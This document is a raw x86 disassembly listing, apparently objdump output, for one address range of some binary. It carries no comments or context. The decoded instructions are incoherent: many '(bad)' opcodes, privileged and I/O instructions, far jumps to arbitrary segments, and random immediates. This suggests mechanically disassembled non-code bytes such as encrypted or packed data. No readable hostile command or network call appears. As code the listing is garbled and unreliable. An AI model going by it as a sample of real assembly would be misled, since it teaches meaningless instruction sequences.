  40de37:	imul   edi,DWORD PTR [eax],0xb88b4483
  40de3d:	les    esp,FWORD PTR [ebx]
  40de3f:	cld    
  40de40:	repz mov WORD PTR [edx+0x4f12e355],ss
  40de47:	les    edi,FWORD PTR [esi+0x29]
  40de4a:	mov    ecx,0xfbee9082
  40de4f:	mov    bh,0x83
  40de51:	jmp    DWORD PTR [ebx+0x3c]
  40de54:	add    BYTE PTR [esp+edi*4+0x21],0x83
  40de59:	mov    dl,BYTE PTR [edi-0x4fca1f89]
  40de5f:	rcr    DWORD PTR [eax],1
  40de61:	lds    ecx,FWORD PTR [esp+esi*8]
  40de64:	xor    edx,ebp
  40de66:	data16 (bad) 
  40de68:	aas    
  40de69:	repnz add BYTE PTR [ebx+0x2],al
  40de6d:	and    eax,0xb879af37
  40de72:	adc    al,0x65
  40de74:	xchg   edi,eax
  40de75:	dec    ecx
  40de76:	js     0x40de31
  40de78:	dec    esi
  40de79:	mov    cl,0xdd
  40de7b:	popa   
  40de7c:	rcr    DWORD PTR [eax-0x79],0x77
  40de80:	(bad)  
  40de81:	adc    DWORD PTR [ebx-0x6c],ebp
  40de84:	pushf  
  40de85:	hlt    
  40de86:	out    0xbc,al
  40de88:	vmread DWORD PTR [edi+0x6f],esi
  40de8c:	add    BYTE PTR [esi+0x507722f9],dh
  40de92:	sahf   
  40de93:	adc    eax,0x6263b61b
  40de98:	lods   al,BYTE PTR ds:[esi]
  40de99:	pop    esp
  40de9a:	popa   
  40de9b:	lea    edx,[edx-0x5]
  40de9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de9f:	outs   dx,BYTE PTR ds:[esi]
  40dea0:	sub    al,0x51
  40dea2:	pop    eax
  40dea3:	sub    ah,bl
  40dea5:	adc    al,0x91
  40dea7:	xor    al,bl
  40dea9:	inc    ebx
  40deaa:	pusha  
  40deab:	data16 ror BYTE PTR [ebx-0x4a517d78],1
  40deb2:	lods   eax,DWORD PTR ds:[esi]
  40deb3:	scas   eax,DWORD PTR es:[edi]
  40deb4:	loopne 0x40df0c
  40deb6:	nop
  40deb7:	daa    
  40deb8:	daa    
  40deb9:	push   ss
  40deba:	inc    esi
  40debb:	mov    ds:0x86dbeac,al
  40dec0:	mov    bh,0x7f
  40dec2:	or     DWORD PTR [ebp-0x3],ebx
  40dec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dec6:	fistp  DWORD PTR [ebx]
  40dec8:	scas   al,BYTE PTR es:[edi]
  40dec9:	cmp    BYTE PTR [edi-0x3a154aa],bh
  40decf:	sub    eax,0xa34eb8f3
  40ded4:	pop    ds
  40ded5:	test   al,0xd9
  40ded7:	sbb    eax,ecx
  40ded9:	inc    ebx
  40deda:	stos   BYTE PTR es:[edi],al
  40dedb:	inc    edi
  40dedc:	inc    eax
  40dedd:	(bad)  
  40dede:	cmp    eax,0x8f974406
  40dee3:	cmp    edi,DWORD PTR [ebx-0x4b]
  40dee6:	jge    0x40dec8
  40dee8:	in     al,dx
  40dee9:	add    al,dl
  40deeb:	imul   ecx,DWORD PTR [ebx-0x59],0xd84520aa
  40def2:	xchg   esp,eax
  40def3:	cs inc ecx
  40def5:	mov    cl,al
  40def7:	cmp    DWORD PTR ds:0x64f5ffe5,0xffffffd4
  40defe:	inc    ebp
  40deff:	retf   
  40df00:	xchg   cl,ah
  40df02:	mul    BYTE PTR gs:[ebx]
  40df05:	cmp    ch,bh
  40df07:	in     al,dx
  40df08:	adc    edx,DWORD PTR [edx+ebp*2+0x24]
  40df0c:	fdivr  DWORD PTR [ebp-0x12]
  40df0f:	xchg   ecx,eax
  40df10:	rcr    BYTE PTR [esi+0x67],0xcf
  40df14:	and    DWORD PTR [esi-0x9],0x7228ffea
  40df1b:	lods   al,BYTE PTR ds:[esi]
  40df1c:	cmp    al,0x5
  40df1e:	jns    0x40df2e
  40df20:	outs   dx,BYTE PTR ds:[esi]
  40df21:	enter  0x5d3,0x83
  40df25:	ret    
  40df26:	mov    ebx,DWORD PTR [ebx]
  40df28:	shl    eax,0xeb
  40df2b:	inc    ebx
  40df2c:	hlt    
  40df2d:	pop    es
  40df2e:	adc    ebx,eax
  40df30:	adc    cl,BYTE PTR [ebx+0x3476da67]
  40df36:	js     0x40df99
  40df38:	cld    
  40df39:	imul   ebp,edi,0x1d13a8e8
  40df3f:	push   cs
  40df40:	(bad)  
  40df41:	xor    bh,dl
  40df43:	out    0x94,ax
  40df46:	inc    edx
  40df47:	in     eax,dx
  40df48:	fdiv   QWORD PTR gs:[eax]
  40df4b:	outs   dx,DWORD PTR ds:[esi]
  40df4c:	jns    0x40df60
  40df4e:	(bad)  
  40df4f:	(bad)  
  40df50:	in     eax,0x6d
  40df52:	sub    esp,DWORD PTR [edx+0x4bfe1a82]
  40df58:	mov    ebx,0x6a0e852c
  40df5d:	scas   eax,DWORD PTR es:[edi]
  40df5e:	in     al,0x33
  40df60:	inc    ecx
  40df61:	or     DWORD PTR [edi+0x3a],esp
  40df64:	sub    BYTE PTR [eax+0x78],dl
  40df67:	nop
  40df68:	aas    
  40df69:	push   ecx
  40df6a:	jne    0x40df9b
  40df6c:	xor    ebp,DWORD PTR [edi+0x48]
  40df6f:	cmp    eax,0x4a69cd3c
  40df74:	aas    
  40df75:	mov    ah,0xcb
  40df77:	call   0xc78a:0x4a5bb141
  40df7e:	(bad)  
  40df7f:	cmp    ah,BYTE PTR [eax-0x71]
  40df82:	xchg   dh,dl
  40df84:	aam    0x22
  40df86:	sti    
  40df87:	neg    BYTE PTR [edi]
  40df89:	pop    esp
  40df8a:	shl    BYTE PTR [eax+ecx*4+0x44b46beb],0xf5
  40df92:	add    al,BYTE PTR ss:[ecx-0x1da9a6ac]
  40df99:	test   eax,0xb25321b2
  40df9e:	push   0xffffffe1
  40dfa0:	mov    ebp,0x79e62b31
  40dfa5:	push   0x11
  40dfa7:	jp     0x40dfcf
  40dfa9:	or     DWORD PTR ds:0x8215b155,0xd2e778b8
  40dfb3:	jmp    ebp
  40dfb5:	out    0x2f,al
  40dfb7:	or     ecx,ebx
  40dfb9:	stos   BYTE PTR es:[edi],al
  40dfba:	in     eax,0x85
  40dfbc:	inc    eax
  40dfbd:	loope  0x40dfbd
  40dfbf:	test   BYTE PTR [ebp+0x3b],0x76
  40dfc3:	outs   dx,BYTE PTR ds:[esi]
  40dfc4:	push   ss
  40dfc5:	jno    0x40dff3
  40dfc7:	lods   eax,DWORD PTR ds:[esi]
  40dfc8:	enter  0x5553,0x7c
  40dfcc:	xor    eax,0xbea89ceb
  40dfd1:	les    esi,FWORD PTR [edx+0x63fd1981]
  40dfd7:	or     eax,0x113f68b7
  40dfdc:	leave  
  40dfdd:	mov    ?,edi
  40dfdf:	jmp    FWORD PTR [ecx-0x6a1b5234]
  40dfe5:	mov    al,0xa7
  40dfe7:	or     BYTE PTR [edx],ah
  40dfe9:	inc    ebp
  40dfea:	add    eax,esp
  40dfec:	mov    al,0xe6
  40dfee:	inc    edi
  40dfef:	imul   ebx,eax,0xffffffea
  40dff2:	mov    bh,0x9a
  40dff4:	mov    ebx,0xe3d284e7
  40dff9:	sbb    ebx,edi
  40dffb:	xor    al,0x3e
  40dffd:	adc    al,0xb2
  40dfff:	adc    DWORD PTR [edx-0x2f],edx
  40e002:	dec    eax
  40e003:	clc    
  40e004:	loopne 0x40e077
  40e006:	dec    esi
  40e007:	ja     0x40e063
  40e009:	daa    
  40e00a:	inc    esi
  40e00b:	pop    edi
  40e00c:	(bad)  
  40e00d:	jmp    0x22fa0d66
  40e012:	xchg   ebx,eax
  40e013:	or     DWORD PTR [ebp-0x588c736],esi
  40e019:	mov    ah,0x2
  40e01b:	adc    BYTE PTR [ebx+0x7479358f],dl
  40e021:	xor    ecx,esp
  40e023:	stos   DWORD PTR es:[edi],eax
  40e024:	push   0xffffffd1
  40e026:	in     al,0x31
  40e028:	or     BYTE PTR [eax-0x629b0d20],0xa3
  40e02f:	out    0x4,al
  40e031:	popa   
  40e032:	call   0xf52d9b41
  40e037:	daa    
  40e038:	add    bh,BYTE PTR [ecx+ecx*8+0x3c21c612]
  40e03f:	inc    esi
  40e040:	test   BYTE PTR cs:[ebp-0x1b941422],0xf4
  40e048:	outs   dx,BYTE PTR ds:[esi]
  40e049:	sbb    DWORD PTR [edi-0xd],ebx
  40e04c:	shl    DWORD PTR [ecx-0xf],cl
  40e04f:	adc    al,0xf4
  40e051:	enter  0x53c4,0x66
  40e055:	adc    BYTE PTR [esi-0x323d81f3],ah
  40e05b:	dec    esp
  40e05c:	sub    al,0xe3
  40e05e:	out    0x25,al
  40e060:	push   esi
  40e061:	or     al,BYTE PTR [esi+0x4a]
  40e064:	retf   
  40e065:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40e067:	and    bh,BYTE PTR [ebx]
  40e069:	out    0xbb,eax
  40e06b:	sbb    ecx,DWORD PTR [ecx-0x33110bb7]
  40e071:	cmp    ecx,DWORD PTR [edx+0x49e1fd89]
  40e077:	int3   
  40e078:	stos   DWORD PTR es:[edi],eax
  40e079:	bound  ebx,QWORD PTR [edx+ebp*2-0x62]
  40e07d:	jo     0x40e081
  40e07f:	mov    esp,0x99dd3a66
  40e084:	icebp  
  40e085:	pop    eax
  40e086:	div    DWORD PTR [eax-0x2]
  40e089:	pop    esi
  40e08a:	xchg   ebp,eax
  40e08b:	fdivr  st(1),st
  40e08d:	mov    ecx,0x286ac791
  40e092:	xchg   ecx,eax
  40e093:	pop    ecx
  40e094:	mov    edx,0x4e4e8851
  40e099:	cmp    al,0x6c
  40e09b:	pop    eax
  40e09c:	jno    0x40e0f3
  40e09e:	xor    bl,ch
  40e0a0:	shr    dl,0xd2
  40e0a3:	jmp    0x749e:0x4baea09
  40e0aa:	pop    ss
  40e0ab:	repnz mov cl,0x10
  40e0ae:	mov    edi,0x73f8fc98
  40e0b3:	or     dh,cl
  40e0b5:	jbe    0x40e0cf
  40e0b7:	push   ss
  40e0b8:	jecxz  0x40e10b
  40e0ba:	mov    BYTE PTR [edx+0x633cffe5],bh
  40e0c0:	jl     0x40e0c3
  40e0c2:	(bad)  
  40e0c3:	std    
  40e0c4:	cs cmp al,0xf1
  40e0c7:	outs   dx,DWORD PTR ds:[esi]
  40e0c8:	iret   
  40e0c9:	sbb    dh,bl
  40e0cb:	inc    ebx
  40e0cc:	adc    esp,DWORD PTR ds:0x1cd703c9
  40e0d2:	les    esp,FWORD PTR [esi-0x64]
  40e0d5:	js     0x40e086
  40e0d7:	adc    al,0x41
  40e0d9:	add    bl,BYTE PTR ss:[edi+0x1b]
  40e0dd:	loopne 0x40e12e
  40e0df:	jle    0x40e14d
  40e0e1:	loop   0x40e070
  40e0e3:	pop    esi
  40e0e4:	sub    DWORD PTR [esi+0x3fdd9b31],ebp
  40e0ea:	sbb    eax,esi
  40e0ec:	sbb    DWORD PTR [ebp-0xdcb66ec],0xffffffe2
  40e0f3:	test   al,0x4a
  40e0f5:	inc    eax
  40e0f6:	sub    al,0xb4
  40e0f8:	adc    ah,BYTE PTR es:[ebx+eax*2]
  40e0fc:	push   esi
  40e0fd:	enter  0xe1dc,0x5a
  40e101:	mov    ch,0x22
  40e103:	aas    
  40e104:	(bad)  
  40e105:	xlat   BYTE PTR ds:[ebx]
  40e106:	ror    ch,0x32
  40e109:	(bad)  
  40e10b:	mov    dl,0x28
  40e10d:	inc    DWORD PTR [esp+ecx*1-0x84c173e]
  40e114:	mov    WORD PTR [edx-0x78],ss
  40e117:	cmp    al,0x7
  40e119:	hlt    
  40e11a:	scas   eax,DWORD PTR es:[edi]
  40e11b:	and    dl,BYTE PTR [eax]
  40e11d:	xor    ebp,esi
  40e11f:	out    dx,eax
  40e120:	push   ds
  40e121:	push   0x449c433e
  40e126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e127:	sbb    eax,0x9171cede
  40e12c:	shr    DWORD PTR [edx+0x20],0x92
  40e130:	fsubr  QWORD PTR [edx]
  40e132:	or     ebx,DWORD PTR [ecx]
  40e134:	repnz loopne 0x40e0d0
  40e137:	cmp    ebx,DWORD PTR [eax+ecx*1]
  40e13a:	pushf  
  40e13b:	pop    edx
  40e13c:	lds    edi,FWORD PTR [eax]
  40e13e:	xor    BYTE PTR [edx+0x43619a7],al
  40e144:	dec    esi
  40e145:	inc    esi
  40e146:	pop    ebp
  40e147:	cmp    BYTE PTR [ebp+0x7af7743f],bl
  40e14d:	jmp    DWORD PTR [ebp-0x666a7960]
  40e153:	push   esi
  40e154:	xlat   BYTE PTR ds:[ebx]
  40e155:	cmc    
  40e156:	dec    edx
  40e157:	imul   ebp,eax,0x3b4f5a50
  40e15d:	mov    esp,ds
  40e15f:	adc    ch,dh
  40e161:	xlat   BYTE PTR ds:[ebx]
  40e162:	mov    ebx,0x793f098d
  40e167:	mov    esp,0xe29b1a4b
  40e16c:	cmp    al,0x85
  40e16e:	outs   dx,DWORD PTR ds:[esi]
  40e16f:	add    eax,DWORD PTR [esi]
  40e171:	(bad)  
  40e172:	pop    ds
  40e173:	cmc    
  40e174:	jle    0x40e157
  40e176:	pop    ebx
  40e177:	lods   eax,DWORD PTR es:[esi]
  40e179:	ret    
  40e17a:	mov    cs,WORD PTR [edi+0x701b5866]
  40e180:	cmp    DWORD PTR [esi],ebp
  40e182:	loope  0x40e11f
  40e184:	jae    0x40e16f
  40e186:	fnsave [edx+ecx*1]
  40e189:	sbb    ecx,ecx
  40e18b:	leave  
  40e18c:	mov    DWORD PTR [ecx-0x4ce5ed7c],ebp
  40e192:	imul   esi,DWORD PTR [ecx+eax*8-0x75],0x20c4c9e9
  40e19a:	inc    esp
  40e19b:	push   cs
  40e19c:	mov    ds:0xc4f86179,eax
  40e1a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1a2:	or     BYTE PTR [esp+ebp*4+0x4f],dl
  40e1a6:	fwait
  40e1a7:	inc    ebp
  40e1a8:	out    dx,eax
  40e1a9:	aam    0x21
  40e1ab:	cmp    dl,BYTE PTR [esi+edi*8-0x36dd256f]
  40e1b2:	mov    ch,0x65
  40e1b4:	cmp    DWORD PTR [eax+0x8a28c3e],ebp
  40e1ba:	mov    ecx,0x40675d32
  40e1bf:	ss pusha 
  40e1c1:	mov    al,fs:0x9c657743
  40e1c7:	adc    al,BYTE PTR [ecx-0x37]
  40e1ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1cb:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1cd:	cmp    al,0x23
  40e1cf:	jp     0x40e200
  40e1d1:	outs   dx,BYTE PTR ds:[esi]
  40e1d2:	dec    edx
  40e1d3:	clc    
  40e1d4:	xor    edx,eax
  40e1d6:	and    eax,0xf0b99ade
  40e1db:	outs   dx,DWORD PTR fs:[esi]
  40e1dd:	lods   al,BYTE PTR ds:[esi]
  40e1de:	or     eax,0xe912390
  40e1e3:	aad    0xa9
  40e1e5:	sub    al,BYTE PTR [ebx+0x162bb09b]
  40e1eb:	xchg   edx,eax
  40e1ec:	xchg   esp,eax
  40e1ed:	push   ds
  40e1ee:	jae    0x40e1d1
  40e1f0:	jbe    0x40e1af
  40e1f2:	sbb    eax,0x59563d9f
  40e1f7:	push   ebp
  40e1f8:	mov    ?,WORD PTR [ebx-0x2b]
  40e1fb:	push   ebx
  40e1fc:	es imul ecx,ebx,0x64
  40e200:	push   esi
  40e201:	dec    eax
  40e202:	shr    bl,cl
  40e204:	scas   eax,DWORD PTR es:[edi]
  40e205:	in     eax,dx
  40e206:	stc    
  40e207:	popf   
  40e208:	jo     0x40e1a5
  40e20a:	jbe    0x40e1dd
  40e20c:	inc    ebx
  40e20d:	add    al,0xf1
  40e20f:	add    eax,0x454272f
  40e214:	dec    eax
  40e215:	fs push esp
  40e217:	cmp    al,0xb3
  40e219:	pusha  
  40e21a:	add    eax,0xd38d9ed
  40e21f:	xchg   esi,eax
  40e220:	jne    0x40e269
  40e222:	(bad)  
  40e223:	hlt    
  40e224:	loopne 0x40e24a
  40e226:	sub    BYTE PTR ds:0xdfaed687,cl
  40e22c:	ror    DWORD PTR [ecx+0x2b9bbbc3],cl
  40e232:	shl    bl,cl
  40e234:	pop    ss
  40e235:	clc    
  40e236:	add    al,0x60
  40e238:	pushf  
  40e239:	fdiv   DWORD PTR [eax-0x7be78c18]
  40e23f:	add    al,0xf3
  40e241:	rcl    BYTE PTR [ecx],1
  40e243:	sar    BYTE PTR [ebp-0x41],1
  40e246:	pusha  
  40e247:	addr16 dec ecx
  40e249:	(bad)  
  40e24a:	lock dec esi
  40e24c:	sub    eax,0x72c1b69f
  40e251:	sbb    ebx,DWORD PTR [ecx]
  40e253:	clc    
  40e254:	mov    bh,bl
  40e256:	fwait
  40e257:	mov    ds:0x59e6a68f,al
  40e25c:	(bad)  
  40e25d:	jae    0x40e2c6
  40e25f:	jge    0x40e297
  40e261:	or     eax,0xedf00ee3
  40e266:	mov    bh,0xe1
  40e268:	sbb    eax,0x676c2267
  40e26d:	xor    bl,BYTE PTR [eax-0x79]
  40e270:	stos   DWORD PTR es:[edi],eax
  40e271:	pop    edi
  40e272:	out    0x52,al
  40e274:	mov    gs,WORD PTR [ebp-0x68]
  40e277:	(bad)  
  40e278:	fnsave [edi+ebp*2-0x49]
  40e27c:	rol    DWORD PTR [eax-0x78],0xf0
  40e280:	xor    al,0x4a
  40e282:	mov    WORD PTR [edx-0x7bd600f2],gs
  40e288:	and    cl,BYTE PTR ds:0xd265e995
  40e28e:	ins    BYTE PTR es:[edi],dx
  40e28f:	push   es
  40e290:	out    dx,al
  40e291:	push   edx
  40e292:	add    DWORD PTR [ebx-0x15da557e],esp
  40e298:	sbb    eax,0x2a8c381d
  40e29d:	fs hlt 
  40e29f:	pusha  
  40e2a0:	sbb    cl,BYTE PTR [edx+0x5b71bea]
  40e2a6:	dec    ecx
  40e2a7:	adc    DWORD PTR [ebp+0xc440071],0xffffffbb
  40e2ae:	jnp    0x40e2df
  40e2b0:	jne    0x40e235
  40e2b2:	push   cs
  40e2b3:	cmp    ah,dh
  40e2b5:	ja     0x40e2ae
  40e2b7:	jl     0x40e242
  40e2b9:	cmp    ebp,edi
  40e2bb:	sub    edx,edi
  40e2bd:	jmp    FWORD PTR [ecx]
  40e2bf:	xchg   esp,eax
  40e2c0:	xchg   DWORD PTR [edi+0x2aeb0e81],eax
  40e2c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2c7:	aad    0x2a
  40e2c9:	in     eax,dx
  40e2ca:	add    BYTE PTR [ebp+ecx*2+0x1edf8520],dh
  40e2d1:	mov    esi,0x9ba803e
  40e2d6:	xchg   esp,eax
  40e2d7:	icebp  
  40e2d8:	imul   DWORD PTR [eax+0x50]
  40e2db:	and    al,0xca
  40e2dd:	sub    ecx,ecx
  40e2df:	jl     0x40e26b
  40e2e1:	sbb    eax,0x26b8c446
  40e2e6:	aas    
  40e2e7:	and    DWORD PTR [eax-0x56d160ad],esi
  40e2ed:	scas   eax,DWORD PTR es:[edi]
  40e2ee:	stc    
  40e2ef:	and    BYTE PTR [ebp+0x30],0xa
  40e2f3:	mov    al,ds:0x5893f632
  40e2f8:	fisub  WORD PTR [eax-0x53c26f99]
  40e2fe:	xchg   dh,ah
  40e300:	sbb    esi,ecx
  40e302:	or     edx,DWORD PTR [eax]
  40e304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e305:	pusha  
  40e306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e307:	imul   ebp,DWORD PTR [edi+0x77],0xffffff9d
  40e30b:	xchg   edx,eax
  40e30c:	jge    0x40e332
  40e30e:	imul   BYTE PTR es:[ebx]
  40e311:	cmp    ebx,DWORD PTR [esi+0x4fd906a0]
  40e317:	cmp    edx,ebp
  40e319:	mov    bl,0x17
  40e31b:	push   edx
  40e31c:	shl    DWORD PTR [esi],cl
  40e31e:	or     eax,0xce587f8a
  40e323:	rol    BYTE PTR [ebp+0x34],1
  40e326:	adc    BYTE PTR [edx+0x7b],0x87
  40e32a:	sub    ebx,DWORD PTR [eax+0xf18d1f]
  40e330:	mov    eax,ds:0xab92a819
  40e335:	cmp    eax,0x6730c7f
  40e33a:	aad    0x6
  40e33c:	inc    esi
  40e33d:	mov    bl,0xea
  40e33f:	push   0x70f949a8
  40e344:	sub    eax,ebx
  40e346:	fiadd  DWORD PTR ds:0x818ce5b0
  40e34c:	adc    al,0xdf
  40e34e:	mov    BYTE PTR [ebx+0x6b],ah
  40e351:	loope  0x40e360
  40e353:	cmp    ecx,DWORD PTR [ebx]
  40e355:	js     0x40e3a3
  40e357:	xchg   esi,eax
  40e358:	pop    esp
  40e359:	cdq    
  40e35a:	xchg   ebp,eax
  40e35c:	(bad)
  40e360:	add    DWORD PTR [esi-0x2b8a180a],ebp
  40e366:	in     eax,dx
  40e367:	push   cs
  40e368:	pop    edx
  40e369:	jb     0x40e355
  40e36b:	or     edx,DWORD PTR [edx]
  40e36d:	icebp  
  40e36e:	or     dh,BYTE PTR [edx-0x54]
  40e371:	dec    edx
  40e372:	dec    esp
  40e373:	(bad)  
  40e374:	mov    ch,0x39
  40e376:	clc    
  40e377:	mov    eax,DWORD PTR [esi+0x6819af03]
  40e37d:	xchg   BYTE PTR [ebp+0x7431403e],al
  40e383:	xchg   edx,eax
  40e384:	push   es
  40e385:	sbb    eax,0xa42863e
  40e38a:	xchg   esp,eax
  40e38b:	arpl   WORD PTR [esi+0x69],di
  40e38e:	or     al,0xe9
  40e390:	repz adc al,0x9e
  40e393:	cwde   
  40e394:	loope  0x40e39e
  40e396:	or     eax,DWORD PTR [edx]
  40e398:	ds mov al,0x7f
  40e39b:	jne    0x40e34c
  40e39d:	add    BYTE PTR [edx+0x5c034f10],dh
  40e3a3:	in     al,dx
  40e3a4:	shl    BYTE PTR [ecx-0x4],1
  40e3a7:	pop    ebx
  40e3a8:	pop    ecx
  40e3a9:	mov    ebx,0x2d256eed
  40e3ae:	fs jae 0x40e369
  40e3b1:	pop    ebp
  40e3b2:	sahf   
  40e3b3:	pop    eax
  40e3b4:	bound  ebx,QWORD PTR [edx+0x28]
  40e3b7:	jmp    0x40e3ce
  40e3b9:	mov    ds:0x4de85abd,eax
  40e3be:	push   ecx
  40e3bf:	dec    edi
  40e3c0:	repz fs into 
  40e3c3:	or     DWORD PTR [ebx],ecx
  40e3c5:	and    eax,0x7f772c04
  40e3ca:	int    0x28
  40e3cc:	in     eax,dx
  40e3cd:	setp   BYTE PTR [ebx-0x13]
  40e3d1:	inc    esp
  40e3d2:	mov    BYTE PTR [ebx-0x57],al
  40e3d5:	push   eax
  40e3d6:	popf   
  40e3d7:	aad    0xda
  40e3d9:	inc    edx
  40e3da:	mov    ebp,DWORD PTR [eax]
  40e3dc:	and    eax,0x48623b04
  40e3e1:	das    
  40e3e2:	mov    ebp,0x24a457c7
  40e3e7:	pop    ecx
  40e3e8:	ins    BYTE PTR es:[edi],dx
  40e3e9:	gs test cl,0xee
  40e3ed:	(bad)  gs:[edi-0x73]
  40e3f1:	lea    edx,[esi+0x6b]
  40e3f4:	call   0x6816:0x5767342f
  40e3fb:	mov    eax,0xf0780607
  40e400:	jmp    0xf0d4f279
  40e405:	pop    edi
  40e406:	fstp   TBYTE PTR [ebp-0x3fc63b50]
  40e40c:	push   ecx
  40e40d:	adc    eax,0x6922891d
  40e412:	sub    al,BYTE PTR [esp+edx*1-0x49904f0a]
  40e419:	aaa    
  40e41a:	fwait
  40e41b:	push   es
  40e41c:	loope  0x40e3bb
  40e41e:	mov    bh,0x9f
  40e420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e421:	mov    cl,0x55
  40e423:	fnstsw WORD PTR [ebx+esi*1+0x7cfaef]
  40e42a:	(bad)  
  40e42b:	sbb    eax,0x16f22779
  40e430:	xchg   edx,eax
  40e431:	mov    ch,0xe9
  40e433:	fwait
  40e434:	sbb    bl,bh
  40e436:	je     0x40e421
  40e438:	leave  
  40e439:	into   
  40e43a:	mov    ds:0x6333bcf7,eax
  40e43f:	or     BYTE PTR [edi],al
  40e441:	aaa    
  40e442:	inc    ebp
  40e443:	addr16 or al,0x8c
  40e446:	mov    BYTE PTR ds:0x3904f0e1,0xe4
  40e44d:	int    0x96
  40e44f:	imul   DWORD PTR [ecx-0x68]
  40e452:	cmp    bh,BYTE PTR [edi+0x39dd6ef6]
  40e458:	lods   eax,DWORD PTR ds:[esi]
  40e459:	lods   eax,DWORD PTR ds:[esi]
  40e45a:	pop    edx
  40e45b:	sti    
  40e45c:	(bad)  
  40e45d:	test   eax,0x58f85f90
  40e462:	jl     0x40e40c
  40e464:	xchg   esp,eax
  40e465:	jo     0x40e411
  40e467:	hlt    
  40e468:	xor    dl,bh
  40e46a:	fld    DWORD PTR [ebp+0x17]
  40e46d:	in     al,dx
  40e46e:	rcl    BYTE PTR [ebx-0x34],1
  40e471:	out    0xe0,al
  40e473:	pop    edi
  40e474:	add    BYTE PTR [edx],ch
  40e476:	fidiv  DWORD PTR [eax+esi*1]
  40e479:	adc    dl,BYTE PTR [ebx+0x79a36066]
  40e47f:	mov    ?,WORD PTR [ecx-0x52]
  40e482:	push   edi
  40e483:	sbb    al,0x50
  40e485:	mov    esi,0xb0fa0361
  40e48a:	push   ds
  40e48b:	adc    dh,BYTE PTR [esi+0x1492b071]
  40e491:	mov    eax,0x83befd8e
  40e496:	retw   
  40e498:	ds ins BYTE PTR es:[edi],dx
  40e49a:	call   0xfa71:0x82707c1
  40e4a1:	mov    al,ds:0x7bc1f598
  40e4a6:	sbb    DWORD PTR [ecx+0x57570446],0x64a742c4
  40e4b0:	inc    edx
  40e4b1:	out    0x6a,al
  40e4b3:	je     0x40e4ff
  40e4b5:	push   edi
  40e4b6:	cdq    
  40e4b7:	popa   
  40e4b8:	jbe    0x40e4ab
  40e4ba:	fisubr DWORD PTR [edi-0x3dde6cf7]
  40e4c0:	jecxz  0x40e511
  40e4c2:	mov    eax,ds:0x847c7e39
  40e4c7:	iret   
  40e4c8:	or     BYTE PTR [edx+edx*8-0xd778b38],bl
  40e4cf:	outs   dx,BYTE PTR ds:[esi]
  40e4d0:	popa   
  40e4d1:	ds pop edi
  40e4d3:	jbe    0x40e507
  40e4d5:	jmp    0x40e488
  40e4d7:	jbe    0x40e4b7
  40e4d9:	pop    edi
  40e4da:	sbb    al,0xdd
  40e4dc:	lods   al,BYTE PTR ds:[esi]
  40e4dd:	popf   
  40e4de:	or     bh,ah
  40e4e0:	xchg   ebp,eax
  40e4e1:	xchg   DWORD PTR [edx-0x1d],ebp
  40e4e4:	mov    eax,0xa1643ade
  40e4e9:	ret    
  40e4ea:	inc    edx
  40e4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4ec:	mov    bh,0x59
  40e4ee:	repz pop ss
  40e4f0:	stc    
  40e4f1:	loope  0x40e4fa
  40e4f3:	push   ecx
  40e4f4:	pop    es
  40e4f5:	add    al,0x5e
  40e4f7:	push   ecx
  40e4f8:	(bad)  
  40e4f9:	arpl   WORD PTR [ecx],sp
  40e4fb:	mov    edx,0x637bb147
  40e500:	int    0x57
  40e502:	jmp    0x40e536
  40e504:	jp     0x40e50f
  40e506:	cmp    ebx,0x7c
  40e509:	pop    edi
  40e50a:	sub    eax,0x7fb10000
  40e50f:	pop    ss
  40e510:	in     eax,dx
  40e511:	mov    al,ds:0x3986bcc1
  40e516:	test   al,0x7e
  40e518:	outs   dx,DWORD PTR ds:[esi]
  40e519:	(bad)  
  40e51a:	and    BYTE PTR [edi+0x29],cl
  40e51d:	mov    ds:0x2e0686cd,eax
  40e522:	cmc    
  40e523:	cmp    al,0x28
  40e525:	cmp    edx,DWORD PTR [edi+0x5d]
  40e528:	pop    ebx
  40e529:	fsubr  QWORD PTR [ebx+eiz*1]
  40e52c:	sbb    bl,ch
  40e52e:	inc    edx
  40e52f:	push   edi
  40e530:	xor    cl,bh
  40e532:	pop    ss
  40e533:	adc    al,0x1e
  40e535:	stos   DWORD PTR es:[edi],eax
  40e536:	cli    
  40e537:	rcl    edx,cl
  40e539:	xchg   ebx,eax
  40e53a:	mov    edi,0x1086d99d
  40e53f:	or     al,0xda
  40e541:	mov    ebp,0xc6e1a95d
  40e546:	faddp  st(5),st
  40e548:	stos   DWORD PTR es:[edi],eax
  40e549:	jne    0x40e5c6
  40e54b:	inc    eax
  40e54c:	scas   al,BYTE PTR es:[edi]
  40e54d:	dec    esi
  40e54e:	aas    
  40e54f:	mov    eax,ds:0x3d1ffcdb
  40e554:	test   al,0x95
  40e556:	stos   BYTE PTR es:[edi],al
  40e557:	inc    edx
  40e558:	xor    BYTE PTR [edx-0x42],bh
  40e55b:	fistp  WORD PTR [edx+esi*4]
  40e55e:	pmullw mm1,QWORD PTR [eax-0x59]
  40e562:	(bad)  
  40e563:	jb     0x40e5c9
  40e565:	xor    al,0x83
  40e567:	je     0x40e5ab
  40e569:	push   ss
  40e56a:	nop
  40e56b:	scas   al,BYTE PTR es:[edi]
  40e56c:	adc    BYTE PTR [ebp+0xf],ch
  40e56f:	es ins DWORD PTR es:[edi],dx
  40e571:	sub    eax,0x3d28b88
  40e576:	adc    BYTE PTR fs:[ecx+edx*8+0x39],cl
  40e57b:	xor    DWORD PTR [esi+eax*2-0x5b],ebp
  40e57f:	dec    ebx
  40e580:	imul   ebp,DWORD PTR [ebx+0xd],0x5dd80a16
  40e587:	call   FWORD PTR [eax+0x3c]
  40e58a:	aam    0x9f
  40e58c:	cmc    
  40e58d:	stc    
  40e58e:	mov    al,ds:0xa2aaa698
  40e593:	jnp    0x40e530
  40e595:	lea    esi,[edi]
  40e597:	cs call 0x9abab17e
  40e59d:	leave  
  40e59e:	cli    
